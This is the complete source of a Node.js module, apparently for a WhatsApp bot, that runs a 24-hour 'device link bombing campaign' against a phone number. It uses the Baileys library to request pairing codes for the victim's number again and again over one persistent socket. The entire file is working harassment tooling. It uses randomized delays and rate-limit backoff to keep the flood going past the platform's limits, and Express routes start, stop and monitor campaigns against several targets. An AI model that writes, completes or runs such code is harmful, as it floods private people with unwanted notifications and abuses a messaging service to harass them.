// ============================================================
// MODULE: spampair.js
// WhatsApp Bot command: .spampair <phone_number>
// Starts a 24-hour device link bombing campaign against the target
// Uses ONE persistent socket for the entire campaign (not one per attempt)
// ============================================================

const express = require('express');
const crypto = require('crypto');
const EventEmitter = require('events');

// ---------- CONFIGURATION ----------
const DEFAULT_DURATION_HOURS = 24;
const REQUEST_DELAY_MIN_MS = 10000;
const REQUEST_DELAY_MAX_MS = 16000;

// ---------- STATE ----------
const activeCampaigns = new Map(); // phone -> { spamPair, stopFlag, stats, startTime }

class SpamPair extends EventEmitter {
  constructor(phoneNumber, durationHours = DEFAULT_DURATION_HOURS) {
    super();
    this.phone = this._formatNumber(phoneNumber);
    this.durationMs = durationHours * 60 * 60 * 1000;
    this.stopFlag = false;
    this.stats = { attempts: 0, success: 0, errors: 0 };
    this.sessionId = crypto.randomBytes(8).toString('hex');
    this._runLoop = this._runLoop.bind(this);
    this._timer = null;
    this._baileys = null;
    this._sock = null;           // persistent single socket
    this._connPromise = null;    // in-flight connection promise
    this._connUpdateHandler = null;
  }

  // ---------- UTILITIES ----------
  _formatNumber(num) {
    let clean = String(num || '').replace(/\D/g, '');
    if (!clean.startsWith('91')) clean = '91' + clean;
    return clean;
  }

  _randomDelay() {
    return Math.floor(Math.random() * (REQUEST_DELAY_MAX_MS - REQUEST_DELAY_MIN_MS + 1)) + REQUEST_DELAY_MIN_MS;
  }

  _sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  // ---------- LAZY LOAD BAILEYS ----------
  _ensureBaileys() {
    if (!this._baileys) {
      try {
        const baileys = require("@whiskeysockets/baileys");
        const { default: makeWASocket, initAuthCreds, DisconnectReason, makeCacheableSignalKeyStore, fetchLatestBaileysVersion, Browsers } = baileys;
        this._baileys = { makeWASocket, initAuthCreds, DisconnectReason, makeCacheableSignalKeyStore, fetchLatestBaileysVersion, Browsers };
        this._browser = Browsers?.ubuntu('Chrome');
      } catch (_be) {
        throw new Error('Baileys library not available in this environment');
      }
    }
    return this._baileys;
  }

  // ---------- PERSISTENT SOCKET — connect once, reuse for all attempts ----------
  async _ensureSocket() {
    if (this._sock && this._sock.ws?.isOpen) return true;
    if (this._connPromise) return this._connPromise;

    this._connPromise = this._connectSocket();
    try {
      return await this._connPromise;
    } finally {
      this._connPromise = null;
    }
  }

  async _connectSocket() {
    const { makeWASocket, initAuthCreds, DisconnectReason, fetchLatestBaileysVersion, Browsers } = this._ensureBaileys();

    const authCreds = initAuthCreds();
    const state = {
      creds: authCreds,
      keys: { get: async () => null, set: async () => {}, delete: async () => {} }
    };

    const { version } = await fetchLatestBaileysVersion();

    // Connection promise (Promise.withResolvers not available in Node 20)
    let connResolve, connReject;
    const connPromise = new Promise((res, rej) => { connResolve = res; connReject = rej; });
    this._connUpdateHandler = (update) => {
      if (update.connection === 'open') connResolve(true);
      if (update.lastDisconnect?.error) connReject(update.lastDisconnect.error);
    };

    this._sock = makeWASocket({
      version,
      browser: this._browser || Browsers.ubuntu('Chrome'),
      auth: {
        creds: state.creds,
        keys: state.keys
      },
      generateHighQualityLinkPreview: false,
      shouldSyncHistoryMessage: () => false,
      getMessage: async () => undefined,
      connectTimeoutMs: 15000,
      defaultQueryTimeoutMs: 15000,
      logger: { info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {}, child: () => ({ info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {} }) }
    });

    this._sock.ev.on('connection.update', this._connUpdateHandler);

    // Wait up to 25s for noise handshake + server greeting
    await Promise.race([
      connPromise,
      new Promise((_, rej) => setTimeout(() => rej(new Error('Socket connect timeout')), 25000))
    ]);

    // Extra buffer so initial server stanzas arrive
    await this._sleep(2000);
    return true;
  }

  // ---------- CORE ATTEMPT — reuses the persistent socket ----------
  async _attemptLink() {
    try {
      // Ensure socket is connected (reconnects if dead)
      await this._ensureSocket();
      if (!this._sock || !this._sock.ws?.isOpen) {
        throw new Error('Socket disconnected');
      }

      // requestPairingCode with timeout
      const code = await Promise.race([
        this._sock.requestPairingCode(this.phone),
        new Promise((_, rej) => setTimeout(() => rej(new Error('pairing code timeout')), 20000))
      ]);

      this.stats.attempts++;
      this.stats.success++;
      return true;

    } catch (error) {
      this.stats.attempts++;
      this.stats.errors++;
      const errMsg = String(error?.message || error || 'Unknown').slice(0, 200);

      if (errMsg.includes('429') || errMsg.includes('rate-overlimit') || errMsg.includes('too-fast')) {
        this.emit('rate-limit', { phone: this.phone, detail: errMsg });
        await this._sleep(45000);
      } else if (errMsg.includes('not connected') || errMsg.includes('connect') || errMsg.includes('handshake') || errMsg.includes('disconnect')) {
        // Socket died — reconnect on next attempt
        this._cleanupSocket();
        await this._sleep(15000);
      } else {
        // Generic error — brief pause
        await this._sleep(5000);
      }
      return false;
    }
  }

  _cleanupSocket() {
    if (this._sock) {
      if (this._connUpdateHandler) {
        try { this._sock.ev?.off('connection.update', this._connUpdateHandler); } catch (_) {}
      }
      try { this._sock.end(new Error('SpamPair: cleanup')); } catch (_) {}
      this._sock = null;
      this._connUpdateHandler = null;
    }
    this._connPromise = null;
  }

  // ---------- MAIN LOOP ----------
  async _runLoop() {
    const startTime = Date.now();
    this.emit('start', { phone: this.phone, duration: this.durationMs });

    while (!this.stopFlag && (Date.now() - startTime) < this.durationMs) {
      await this._attemptLink();

      // Progress every 10 attempts
      if (this.stats.attempts % 10 === 0) {
        this.emit('progress', {
          phone: this.phone,
          attempts: this.stats.attempts,
          success: this.stats.success,
          errors: this.stats.errors,
          elapsed: Math.round((Date.now() - startTime) / 1000)
        });
      }

      // Random delay between attempts
      await this._sleep(this._randomDelay());

      // Refresh session ID occasionally
      if (this.stats.attempts % 50 === 0) {
        this.sessionId = crypto.randomBytes(8).toString('hex');
      }
    }

    // Campaign done or stopped — cleanup socket
    this._cleanupSocket();
    this.emit('done', {
      phone: this.phone,
      totalAttempts: this.stats.attempts,
      totalSuccess: this.stats.success,
      totalErrors: this.stats.errors,
      durationSeconds: Math.round((Date.now() - startTime) / 1000)
    });
  }

  // ---------- START / STOP ----------
  start() {
    if (this._timer) {
      this.emit('error', { phone: this.phone, message: 'Already running' });
      return;
    }
    this.stopFlag = false;
    this._runLoop().catch(err => this.emit('error', { phone: this.phone, error: err.message }));
    return this;
  }

  stop() {
    this.stopFlag = true;
    this._cleanupSocket();
    this.emit('stopped', { phone: this.phone, stats: this.stats });
    return this;
  }

  getStats() {
    return { phone: this.phone, ...this.stats, running: !this.stopFlag };
  }
}

// ================================================================
// EXPRESS API ROUTES
// ================================================================

const router = express.Router();

// ── POST /api/spampair/start ──────────────────────────────────────
router.post('/start', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) {
    return res.status(400).json({ error: 'Missing phoneNumber' });
  }

  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (activeCampaigns.has(cleanNumber)) {
    const campaign = activeCampaigns.get(cleanNumber);
    return res.json({
      status: 'already_running',
      phone: cleanNumber,
      stats: campaign.stats
    });
  }

  const campaign = new SpamPair(phoneNumber);
  activeCampaigns.set(cleanNumber, {
    spamPair: campaign,
    stats: campaign.stats,
    startTime: Date.now()
  });

  campaign.start();

  res.json({
    status: 'started',
    phone: cleanNumber,
    sessionId: campaign.sessionId,
    durationHours: DEFAULT_DURATION_HOURS
  });
});

// ── POST /api/spampair/stop ───────────────────────────────────────
router.post('/stop', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) {
    return res.status(400).json({ error: 'Missing phoneNumber' });
  }

  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (!activeCampaigns.has(cleanNumber)) {
    return res.status(404).json({ error: 'No active campaign for this number', phone: cleanNumber });
  }

  const entry = activeCampaigns.get(cleanNumber);
  entry.spamPair.stop();
  activeCampaigns.delete(cleanNumber);

  res.json({
    status: 'stopped',
    phone: cleanNumber,
    stats: entry.stats
  });
});

// ── GET /api/spampair/status ──────────────────────────────────────
router.get('/status', (req, res) => {
  if (activeCampaigns.size === 0) {
    return res.json({ campaigns: [] });
  }

  const campaigns = [];
  for (const [phone, entry] of activeCampaigns) {
    campaigns.push({
      phone,
      stats: entry.spamPair.getStats(),
      running: !entry.spamPair.stopFlag,
      startedAt: entry.startTime
    });
  }
  res.json({ campaigns });
});

module.exports = router;
module.exports.SpamPair = SpamPair;
module.exports.activeCampaigns = activeCampaigns;
